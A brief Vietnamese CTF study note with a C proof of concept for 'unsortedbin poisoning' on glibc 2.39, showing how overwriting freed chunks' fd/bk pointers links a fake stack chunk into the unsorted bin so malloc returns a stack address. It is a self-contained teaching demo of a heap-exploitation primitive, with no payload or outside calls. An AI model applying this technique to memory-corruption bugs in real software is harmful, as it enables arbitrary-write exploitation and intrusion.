<details>
<summary><strong>Description</strong></summary>
<p>

Kĩ thuật này cho phép chúng ta tạo ra một fake chunk và đặt nó vào unsortedbin.

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

Được dùng trong glibc `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, stack_array[10], *chunk3;

    // allocate two unsortedbin range chunks
    chunk0 = malloc(0x420);
    malloc(0x18); // padding to prevent consolidation
    chunk1 = malloc(0x420);
    malloc(0x18); // padding to prevent consolidation

    free(chunk0); // insert them into the unsorted bin
    free(chunk1);

    // create the unsorted bin fake chunk header
    // stack_array[0] = 0x00; // fake chunk's prev_size (usually we dont need to care about this)
    stack_array[1] = 0x41; // fake chunk's size (turn on the prev_inuse for easier)

    // add a fake heap chunk header, right after the end of our fake unsorted bin chunk
    // this is because there are checks for the next adjacent chunk, since if malloc properly allocated this (fake) chunk, there would be one there
    stack_array[8] = 0x40; // fake adjacent chunk prev_size
    stack_array[9] = 0x50; // fake adjacent chunk size (turn off the prev_inuse)

    // set the fwd/bk pointers of our unsorted bin fake chunk, so that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk0 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // now we will link in our fake chunk via overwriting the fwd/bk ptr of two other chunks in the unsorted bin
    // which we have already linked against with our fake unsorted bin chunk
    /*VULNERABILITY*/
    chunk0[1] = (long)(stack_array); // bk
    chunk1[0] = (long)(stack_array); // fwd
    /*VULNERABILITY*/

    // now fake chunk is in unsortedbin and ready to allocate (it will act like normal unsortedbin (behaviour))
    chunk3 = malloc(0x38);

    printf("chunk3: %p\n", chunk3);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/lieuhoaisa/CTFnotes/tree/main/heap/primitives/unsortedbin/unsortedbin_poisoning

</p>
</details>